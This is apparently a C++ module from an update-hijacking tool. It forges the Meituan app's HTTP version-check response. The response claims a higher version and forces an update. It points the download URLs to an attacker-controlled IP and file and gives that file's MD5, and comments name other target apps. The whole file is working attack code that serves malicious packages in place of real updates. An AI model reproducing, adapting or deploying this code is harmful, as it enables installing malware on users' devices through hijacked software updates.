


#include "MeiTuan.h"
#include <windows.h>
#include <iostream>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "../cipher/CryptoUtils.h"
#include "../HttpUtils.h"


using namespace std;

//dianping
//neteasenews
//kugou
//baofeng
//meituan
//


int MeiTuan::prepareRespData(unsigned long ulIP, string filepath, string filename) {

	int ret = 0;

	int curver = 900990601;
	string strver = "9.99.601";

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);
	if (ret == FALSE)
	{
		return FALSE;
	}

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json;charset=utf-8\r\nContent-Length: %u\r\n"
		//"Content-Encoding: identity\r\n"
		"M-Appkey: com.sankuai.wpt.eva.evaapi\r\n"
		"M-SpanName: RulesController.legacyAppstatus\r\n"
		"M-TraceId: 2269498580504431494\r\n"
		"Connection: Keep-Alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"{\"versioninfo\":{"
		"\"appHttpsUrl\":\"https://%s/%s\","
		"\"appurl\":\"http://%s/%s\","
		"\"changeLog\":\"hello how are you?\","			//【美食】领取老客券，餐餐都打折<br/>【周边游】发现新鲜地 ，玩出新花样
		"\"currentVersion\":%u,"
		//"\"diffInfo\" : {\"channel\":\"huawei\","
		//"\"diffHttpsUrl\" : \"https://%s/%s\","
		//"\"diffUrl\" : \"http://%s/%s\","
		//"\"extraInfo\" : {\"mtbuildtime\":\".99999.99999999\",\"mthash\" : \"\"},"		//29547.05211612
		//"\"md5Diff\" : \"\",\"md5New\" : \"%s\"},"
		"\"forceupdate\":1,\"installAlertFrequency\":3,\"isUpdated\":false,\"md5\":\"%s\",\"versionUpgradeControl\":\"p1\",\"versionname\":\"%s\"}}\r\n\r\n";

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
// 		szip.c_str(), filename.c_str(), 
// 		szip.c_str(), filename.c_str(), 
		szip.c_str(), filename.c_str(),
		szip.c_str(), filename.c_str(),
		curver, 
//		szip.c_str(), filename.c_str(), szip.c_str(), filename.c_str(),
//		szip.c_str(), filename.c_str(), szip.c_str(), filename.c_str(),
//		m_szmd5,
		m_szmd5, strver.c_str());


	char lptmp[MAX_RESPONSE_HEADER_SIZE];
	int tmplen = sprintf_s(lptmp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);

	memcpy(m_lpResp, lptmp, tmplen);
	m_iRespSize = tmplen;
	//m_iRespSize = Public::GBKToUTF8(lptmp, tmplen, m_lpResp, MAX_RESPONSE_HEADER_SIZE);

	return m_iRespSize;
}